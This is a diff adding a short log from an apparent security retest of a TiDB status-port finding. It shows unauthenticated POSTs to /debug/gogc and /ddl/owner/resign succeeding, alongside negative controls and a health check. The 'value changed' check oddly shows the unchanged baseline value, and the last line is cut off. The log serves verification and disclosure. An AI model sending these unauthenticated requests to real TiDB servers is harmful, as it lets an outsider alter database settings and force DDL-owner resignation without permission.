@@ -1,0 +1,18 @@
+=== TIDB-STATUS-WRITE-01 E2E retest 2026-09-05T21:50:42-05:00 ===
+--- baseline GET /debug/gogc ---
+500
+--- [negative control] GET has no side effect; reading twice returns same value ---
+500
+--- exploit 1: unauthenticated POST /debug/gogc 42 ---
+[HTTP 200]
+--- verified: value changed ---
+500
+--- restore GOGC=100 ---
+
+100
+--- exploit 2: unauthenticated POST /ddl/owner/resign ---
+"success!" [HTTP 200]
+--- [negative control] invalid upgrade op rejected (method/op gate exists there) ---
+wrong operation:pause [HTTP 400]
+--- server healthy after writes ---
+{"connections":0,"version":"8.0.11-TiDB-v26.3.10-dirty","git_hash":"6b4c9f9dce21
